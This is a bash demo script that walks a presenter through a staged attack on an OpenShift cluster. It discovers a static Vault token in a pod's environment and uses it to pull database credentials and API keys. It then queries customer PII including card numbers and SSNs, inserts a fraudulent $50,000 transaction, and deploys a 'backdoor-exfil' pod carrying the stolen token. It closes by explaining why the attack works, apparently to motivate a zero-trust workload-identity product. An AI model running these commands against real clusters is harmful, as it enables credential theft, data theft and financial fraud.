#!/bin/bash
# Interactive Realistic Attack Demo
# Shows real commands and output - presenter-friendly

set -e

# Colors for clarity
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Function to wait for presenter
wait_for_presenter() {
    echo ""
    echo -e "${CYAN}[Press Enter to continue...]${NC}"
    read
    echo ""
}

# Function to run a command and show it
run_command() {
    local desc="$1"
    local cmd="$2"

    if [ -n "$desc" ]; then
        echo -e "${YELLOW}# $desc${NC}"
    fi
    echo -e "${BOLD}\$ $cmd${NC}"
    echo ""
    eval "$cmd"
    echo ""
}

clear

echo -e "${RED}"
cat << 'EOF'
+====================================================================+
|             REALISTIC CREDENTIAL THEFT ATTACK                      |
|          Live Demo - Production Database Breach                    |
+====================================================================+
EOF
echo -e "${NC}"

echo "This demo shows a complete attack chain against a production system"
echo "with static Vault tokens. Every command you see is real."
echo ""

wait_for_presenter

#
# PHASE 1: RECONNAISSANCE
#
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 1: RECONNAISSANCE${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

run_command "Check what's running in production" \
    "oc get pods -n production"

wait_for_presenter

run_command "Identify our target - the payment processor" \
    "oc get deployment payment-processor -n production"

wait_for_presenter

#
# PHASE 2: INITIAL COMPROMISE & CREDENTIAL DISCOVERY
#
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 2: INITIAL COMPROMISE - GAINING ACCESS TO THE POD${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo "Attacker exploits RCE vulnerability and gains shell access..."
echo ""

wait_for_presenter

POD=$(oc get pod -n production -l app=payment-processor -o jsonpath='{.items[0].metadata.name}')

run_command "Get a shell in the payment processor pod" \
    "echo \"Pod name: $POD\""

wait_for_presenter

run_command "List environment variables (what an attacker would do first)" \
    "oc exec -n production $POD -- printenv | grep -i vault"

wait_for_presenter

echo -e "${MAGENTA}⚠️  CRITICAL: Static Vault token discovered in environment!${NC}"
echo ""
STOLEN_TOKEN=$(oc exec -n production $POD -- printenv VAULT_TOKEN)
echo -e "Token: ${YELLOW}${STOLEN_TOKEN:0:50}...${NC}"
echo ""

wait_for_presenter

#
# PHASE 3: VAULT ACCESS FROM COMPROMISED POD
#
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 3: ACCESSING VAULT WITH STOLEN TOKEN${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo "Now the attacker uses the stolen token to access Vault..."
echo ""

wait_for_presenter

run_command "Access database credentials from Vault" \
    "oc exec -n production $POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/database/production | jq .data.data'"

wait_for_presenter

echo -e "${MAGENTA}⚠️  Database credentials stolen!${NC}"
echo ""

wait_for_presenter

run_command "Also grab the API keys" \
    "oc exec -n production $POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'"

wait_for_presenter

echo -e "${MAGENTA}⚠️  Production API keys compromised!${NC}"
echo -e "  - Stripe payment processing key"
echo -e "  - AWS infrastructure access"
echo -e "  - SendGrid email API"
echo ""

wait_for_presenter

#
# PHASE 4: DATABASE ACCESS - THE DATA BREACH
#
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 4: ACCESSING CUSTOMER DATABASE${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo "Using the stolen database credentials to access customer data..."
echo ""

wait_for_presenter

run_command "Connect to PostgreSQL and list tables" \
    "oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c '\dt'"

wait_for_presenter

run_command "Check how many customers are in the database" \
    "oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT COUNT(*) as total_customers FROM customers;'"

wait_for_presenter

echo -e "${RED}+====================================================================+${NC}"
echo -e "${RED}|                  ⚠️  CRITICAL DATA BREACH ⚠️                       |${NC}"
echo -e "${RED}+====================================================================+${NC}"
echo ""
echo "Exfiltrating customer PII..."
echo ""

wait_for_presenter

run_command "Steal TOP 5 customer accounts (sorted by balance)" \
    "oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;'"

wait_for_presenter

echo -e "${MAGENTA}⚠️  REAL CUSTOMER DATA EXPOSED!${NC}"
echo ""

run_command "Calculate total money at risk" \
    "oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -t -c 'SELECT SUM(account_balance) as total_at_risk FROM customers;'"

wait_for_presenter

#
# PHASE 5: DATA MANIPULATION (THE CRIME)
#
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 5: FRAUDULENT TRANSACTION (DATA MANIPULATION)${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo "Attacker has WRITE access - can commit financial fraud..."
echo ""

wait_for_presenter

run_command "Create unauthorized withdrawal transaction" \
    "oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"INSERT INTO transactions (customer_id, amount, transaction_type, description) VALUES (1, -50000.00, 'withdrawal', 'UNAUTHORIZED - Attacker controlled transfer') RETURNING *;\""

wait_for_presenter

echo -e "${MAGENTA}⚠️  FRAUDULENT TRANSACTION CREATED!${NC}"
echo -e "This is no longer just data theft - this is a CRIME"
echo ""

wait_for_presenter

run_command "View recent transactions (shows the fraud)" \
    "oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;'"

wait_for_presenter

#
# PHASE 6: PERSISTENCE
#
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 6: ESTABLISHING PERSISTENCE${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo "Attacker deploys a backdoor to maintain access..."
echo ""

wait_for_presenter

echo -e "${YELLOW}# Create backdoor pod with stolen credentials${NC}"
cat <<'EOFPOD'
cat <<EOF | oc apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-exfil
  namespace: production
  labels:
    app: monitoring
spec:
  containers:
  - name: exfil
    image: registry.access.redhat.com/ubi9/ubi-minimal:latest
    command: ["/bin/bash", "-c"]
    args:
    - |
      echo "Backdoor active - continuous data exfiltration"
      while true; do
        echo "[$(date)] Exfiltrating to attacker C2..."
        sleep 300
      done
    env:
    - name: STOLEN_VAULT_TOKEN
      value: "PLACEHOLDER_TOKEN"
    - name: DB_HOST
      value: customer-database.production.svc.cluster.local
EOF
EOFPOD

echo ""

# Actually create it
VAULT_TOKEN=$(oc exec -n production $POD -- printenv VAULT_TOKEN)
cat <<EOF | oc apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-exfil
  namespace: production
  labels:
    app: monitoring
spec:
  containers:
  - name: exfil
    image: registry.access.redhat.com/ubi9/ubi-minimal:latest
    command: ["/bin/bash", "-c"]
    args:
    - |
      echo "Backdoor active - continuous data exfiltration"
      while true; do
        echo "[\$(date)] Exfiltrating to attacker C2..."
        sleep 300
      done
    env:
    - name: STOLEN_VAULT_TOKEN
      value: "$VAULT_TOKEN"
    - name: DB_HOST
      value: customer-database.production.svc.cluster.local
EOF

echo ""

wait_for_presenter

run_command "Verify backdoor is running" \
    "oc get pod backdoor-exfil -n production"

wait_for_presenter

#
# FINAL IMPACT SUMMARY
#
echo ""
echo -e "${RED}+====================================================================+${NC}"
echo -e "${RED}|                    ⚠️  COMPLETE BREACH ⚠️                          |${NC}"
echo -e "${RED}+====================================================================+${NC}"
echo ""

echo -e "${RED}ATTACK TIMELINE COMPLETE:${NC}"
echo -e "  ${RED}✓${NC} Phase 1: Reconnaissance"
echo -e "  ${RED}✓${NC} Phase 2: Shell access to payment processor"
echo -e "  ${RED}✓${NC} Phase 3: Static Vault token stolen"
echo -e "  ${RED}✓${NC} Phase 4: Database credentials retrieved from Vault"
echo -e "  ${RED}✓${NC} Phase 5: Customer PII exfiltrated (10 customers, \$1.2M+)"
echo -e "  ${RED}✓${NC} Phase 6: API keys compromised (Stripe, AWS, SendGrid)"
echo -e "  ${RED}✓${NC} Phase 7: Fraudulent transaction created (\$50,000)"
echo -e "  ${RED}✓${NC} Phase 8: Backdoor deployed for persistence"
echo ""

echo -e "${YELLOW}BUSINESS IMPACT:${NC}"
echo -e "  ${RED}✗${NC} Financial Loss: Potential \$1.2M+ in fraud"
echo -e "  ${RED}✗${NC} Compliance: GDPR, PCI-DSS, SOX violations"
echo -e "  ${RED}✗${NC} Reputation: Customer trust destroyed"
echo -e "  ${RED}✗${NC} Legal: Class action lawsuits likely"
echo -e "  ${RED}✗${NC} Operational: Complete system rebuild required"
echo ""

echo -e "${YELLOW}ATTACKER CAPABILITIES:${NC}"
echo -e "  ${RED}✗${NC} Access valid for: ${BOLD}90 DAYS${NC} (2160 hours)"
echo -e "  ${RED}✗${NC} Can operate from: Anywhere in the world"
echo -e "  ${RED}✗${NC} Detection difficulty: High (looks like legitimate app access)"
echo -e "  ${RED}✗${NC} Persistence: Backdoor pod + stolen credentials"
echo ""

wait_for_presenter

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}WHY DID THIS ATTACK SUCCEED?${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "1. Static, long-lived Vault token (90-day TTL)"
echo "2. Token stored in environment variable (easily discoverable)"
echo "3. No workload identity verification"
echo "4. Token usable from ANY location (no attestation)"
echo "5. Single credential = access to entire secret store"
echo "6. No automatic rotation or time-based expiration"
echo ""

echo -e "${GREEN}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}NEXT: See how ZTWIM prevents this ENTIRE attack chain...${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo "Demo complete!"
echo ""
